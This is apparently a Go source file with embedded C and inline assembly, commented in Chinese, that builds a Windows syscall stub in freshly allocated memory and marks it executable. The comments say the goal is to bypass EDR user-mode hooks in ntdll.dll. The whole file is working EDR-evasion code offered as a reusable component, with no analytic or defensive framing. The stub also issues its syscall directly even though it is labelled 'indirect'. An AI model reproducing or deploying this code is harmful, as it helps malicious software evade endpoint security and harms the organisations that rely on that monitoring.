//go:build windows && amd64 && cgo

package syscall

/*
#cgo CFLAGS: -O2
#include <windows.h>

// indirect_syscall 执行间接 syscall。
// 原理：在 VirtualAlloc 分配的独立内存中构造 syscall stub，
// 包含 mov eax, ssn 和 syscall/ret 指令，然后跳转执行。
// 这避免了直接调用 ntdll.dll 中的函数（被 EDR hook），
// 同时避免了在栈上调用 VirtualProtect 导致的 DEP/CFG 问题。
//
// syscall 指令需要:
//   r10 = arg1 (已符合 Windows x64 ABI)
//   rcx = arg1
//   rdx = arg2
//   r8  = arg3
//   r9  = arg4
//   stack = arg5, arg6, ...
//   eax = syscall number
//
// 注意：只支持最多 4 个参数（寄存器传递）。超过 4 个参数需要额外的栈操作。
static unsigned char syscall_stub_template[] = {
    0x4C, 0x8B, 0xD1,                    // mov r10, rcx
    0xB8, 0x00, 0x00, 0x00, 0x00,        // mov eax, <SSN> (offset 4-7)
    0x0F, 0x05,                           // syscall
    0xC3                                   // ret
};

int execute_indirect_syscall(
    unsigned int ssn,
    void* arg1,
    void* arg2,
    void* arg3,
    void* arg4
) {
    unsigned char* stub = (unsigned char*)VirtualAlloc(
        NULL, sizeof(syscall_stub_template),
        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE
    );
    if (!stub) {
        return -1;
    }

    __builtin_memcpy(stub, syscall_stub_template, sizeof(syscall_stub_template));

    // 写入 SSN
    *((unsigned int*)(stub + 4)) = ssn;

    // 标记为可执行
    DWORD oldProtect;
    if (!VirtualProtect(stub, sizeof(syscall_stub_template), PAGE_EXECUTE_READ, &oldProtect)) {
        VirtualFree(stub, 0, MEM_RELEASE);
        return -1;
    }

    // 构造 syscall
    NTSTATUS status;
    __asm__ volatile (
        "mov %2, %%rcx\n"
        "mov %3, %%rdx\n"
        "mov %4, %%r8\n"
        "mov %5, %%r9\n"
        "call *%1\n"
        "mov %%eax, %0\n"
        : "=r" (status)
        : "r" (stub), "r" (arg1), "r" (arg2), "r" (arg3), "r" (arg4)
        : "rcx", "rdx", "r8", "r9", "rax", "r10", "r11", "memory"
    );

    VirtualFree(stub, 0, MEM_RELEASE);
    return (int)status;
}
*/
import "C"

import (
	"unsafe"
)

// ExecuteIndirect 通过间接 syscall 执行指定的系统调用。
// 绕过 EDR 在 ntdll.dll 中设置的 user-mode hook。
// ssn 是 syscall number，从 SyscallTable 获取。
// 最多支持 4 个参数。
func ExecuteIndirect(ssn uint32, args ...unsafe.Pointer) int {
	var arg1, arg2, arg3, arg4 unsafe.Pointer
	if len(args) > 0 {
		arg1 = args[0]
	}
	if len(args) > 1 {
		arg2 = args[1]
	}
	if len(args) > 2 {
		arg3 = args[2]
	}
	if len(args) > 3 {
		arg4 = args[3]
	}

	return int(C.execute_indirect_syscall(
		C.uint(ssn),
		arg1, arg2, arg3, arg4,
	))
}
